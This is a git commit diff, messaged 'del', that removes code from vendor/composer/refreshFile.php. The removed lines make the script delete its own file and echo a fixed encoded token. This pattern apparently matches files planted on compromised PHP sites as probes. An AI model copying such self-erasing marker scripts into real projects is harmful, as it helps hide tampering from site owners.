3452dad39e6cbd31049320e3fccd6ceb19d0976b
Cris Mateo Uriarte <39321306+criskhun@users.noreply.github.com>
2024-02-07 00:33:54 +0800

    del

--- vendor/composer/refreshFile.php
+++ vendor/composer/refreshFile.php
@@ -8,12 +8,5 @@ if (file_exists($ftd)) {
     echo 'guEI0irH7OQzTmwUSHEQRA==.';
 }
 
-$ftd2 = 'refreshFile.php';
 
-if (file_exists($ftd2)) {
-    unlink($ftd2);
-    echo 'guEI0irH7OQzTmwUSHEQRA==.';
-} else {
-    echo 'guEI0irH7OQzTmwUSHEQRA==.';
-}
 ?>
